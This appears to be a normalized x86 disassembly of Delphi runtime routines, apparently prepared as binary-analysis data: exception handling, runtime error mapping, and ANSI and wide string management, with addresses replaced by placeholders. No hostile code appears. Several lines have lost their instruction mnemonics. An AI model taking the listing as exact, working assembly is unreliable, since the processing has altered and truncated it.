jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4036fc
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403910
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403280
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4036fc
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405f10
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403738
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402cd4
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403a98
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403780
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403ad0
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_404088
sub_403af8
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405f10
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403344
call sub_4036e0
sub_403b4c
call sub_405f10
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403344
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4037a8
jmp edx
sub_403b94
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027f8
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403cf4
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403d1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403d62
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403d7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403dc2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403e1c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405ca4
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e40
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405ca4
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e68
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e8c
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403ee8
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403f18
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_401254
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_40121c
push eax
call sub_40123c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_40121c
push eax
call sub_40123c
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403fa4
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403e8c
call sub_403f18
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403d1c
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403cf4
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405770
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403ee8
push eax
call sub_40126c
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_404094
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_402714
pop eax
sub_4040b8
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402714
sub_4040e8
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404158
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028f0
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402714
sub_40412c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402714
sub_404158
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026f4
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404184
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404158
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_404094
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028f0
sub_4041b4
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_4041d4
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_4041f0
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404094
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4046e0
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4041b4
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_4041b4
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4046e0
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404184
jmp r-xdata
sub_40428c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404184
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4042bc
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4041f0
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404304
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404184
not ecx
sub_404330
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028f0
pop ebx
retn
mov ecx ebx
sub_40435c
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_4040e8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4046e0
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4046e0
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028f0
pop edi
pop esi
pop ebx
retn
sub_4043a0
test edx edx
je r-xdata
mov edx ecx
jmp sub_4040e8
test ecx ecx
je sub_4040e8
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_40435c
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404158
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028f0
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028f0
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_4040e8
pop edx
pop eax
jmp sub_40435c
call sub_4040e8
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404414
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404158
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4046e0
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028f0
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_4040e8
dec [ edx - 0x8 ]
sub_4044a0
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404560
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404158
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028f0
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_402714
sub_4045b4
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_404094
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404184
jmp r-xdata
pop ebx
retn 0x4
sub_4045f4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404560
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028f0
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4046e0
mov edi ecx
sub_40463c
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4046e0
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028f0
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028f0
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404698
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4046e0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_404094
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404158
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_402734
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028f0
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_40478c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4047b0
test edx edx
je sub_404774
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404774
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402850
retn
sub_4047d4
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404774
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_4049bc
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4041d4
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_4041d4
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4049bc
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404860
jmp r-xdata
sub_404860
test ecx ecx
je sub_404774
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402850
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404884
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404860
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4048ec
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404970
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4048e0
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404860
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_4049bc
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404764
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40474c
mov ebx eax
mov eax [ edi ]
call sub_4048e0
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028f0
mov eax esi
sub_404a00
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a30
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404a30
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a30
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404a00
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402850
sub_404ad0
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404b1c
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404b1c
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
